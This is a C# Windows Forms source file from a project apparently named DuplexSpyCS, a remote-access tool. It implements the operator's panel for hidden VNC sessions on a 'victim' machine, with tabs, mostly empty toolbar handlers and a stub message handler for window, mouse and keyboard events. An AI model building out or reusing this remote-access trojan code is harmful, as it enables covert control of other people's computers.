using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmHVNC : Form
    {
        private clsVictim m_victim { get; init; }

        public frmHVNC(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        struct stHvncSession
        {
            public string szDesktopName;
            public string szExeFilePath;
            public string szArguments;
            public bool bMaximized;
            public TabPage page;

            public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName) || page == null; } }
        }

        private stHvncSession fnGetSession(TabPage page) => page == null ? new stHvncSession() : (stHvncSession)page.Tag;
        private stHvncSession fnGetSession(string szName)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stHvncSession session = fnGetSession(page);
                if (string.Equals(szName, session.szDesktopName))
                    return session;
            }

            return new stHvncSession();
        }

        void fnRecv(clsListener ltn, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "hvnc")
            {
                if (lsMsg[1] == "window")
                {

                }
                else if (lsMsg[1] == "mouse")
                {

                }
                else if (lsMsg[1] == "keyboard")
                {

                }
            }
        }

        /// <summary>
        /// Add new tab page.
        /// For unknown reason, docking style must be set after adding it into control collection.
        /// </summary>
        /// <param name="session">HVNC session structure</param>
        /// <returns>Tab page object</returns>
        TabPage? fnAddNewPage(stHvncSession session)
        {
            TabPage page = new TabPage();
            tabControl1.TabPages.Add(page);
            page.Tag = session;
            session.page = page;

            /* Layout:
             *      | [Start] [Stop] [Close] | Delay: [Combobox(miliseconds)] | [Mouse] [Keyboard] [FPS] [Timestamp] |
             */

            ToolStripButton btnStart = new ToolStripButton("Start");
            btnStart.Click += (s, e) =>
            {

            };

            ToolStripButton btnStop = new ToolStripButton("Stop");


            ToolStripButton btnClose = new ToolStripButton("Close");


            ToolStripComboBox coboxDelay = new ToolStripComboBox();
            coboxDelay.Size = new Size(coboxDelay.Size.Width, 200);
            coboxDelay.Items.AddRange(new string[] { "100", "200", "300", "400", "500" });
            coboxDelay.SelectedIndex = 0;

            ToolStripButton btnMouse = new ToolStripButton("Mouse");


            ToolStripButton btnKeyboard = new ToolStripButton("Keyboard");


            ToolStripButton btnFPS = new ToolStripButton("FPS");


            ToolStripButton btnTs = new ToolStripButton("Timestamp");



            ToolStrip ts = new ToolStrip();
            ts.Items.AddRange(new ToolStripItem[]
            {
                btnStart,
                btnStop,
                btnClose,

                new ToolStripSplitButton(),

                new ToolStripLabel("Delay: "),
                coboxDelay,

                new ToolStripSplitButton(),

                btnMouse,
                btnKeyboard,
                btnFPS,
                btnTs,
            });

            page.Controls.Add(ts);
            ts.Dock = DockStyle.Top;

            PictureBox pb = new PictureBox();
            page.Controls.Add(pb);
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;

            return page;
        }

        void fnSetup()
        {
            // Remove all tabpages
            foreach (TabPage page in tabControl1.TabPages)
                tabControl1.TabPages.Remove(page);

            m_victim.m_listener.ReceivedDecoded += fnRecv;
        }

        private void frmHVNC_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmHVNC_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode selectedNode = treeView1.SelectedNode;
            if (selectedNode == null)
                return;

            string szName = selectedNode.Text;
            var session = fnGetSession(szName);
            if (session.bIsNull)
                return;

            tabControl1.SelectedTab = session.page;
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var session = fnGetSession(page);
            
            listView1.Items.Clear();

            List<(string prop, string val)> ls = new List<(string prop, string val)>();
            ls.AddRange(new[]
            {
                ("Desktop", session.szDesktopName),
                ("Executable", session.szExeFilePath),
                ("Arguments", session.szArguments),
                ("Maximized", session.bMaximized ? "True" : "False"),
            });

            foreach (var prop in ls)
            {
                ListViewItem item = new ListViewItem(prop.prop);
                item.SubItems.Add(prop.val);

                listView1.Items.Add(item);
            }
        }
    }
}
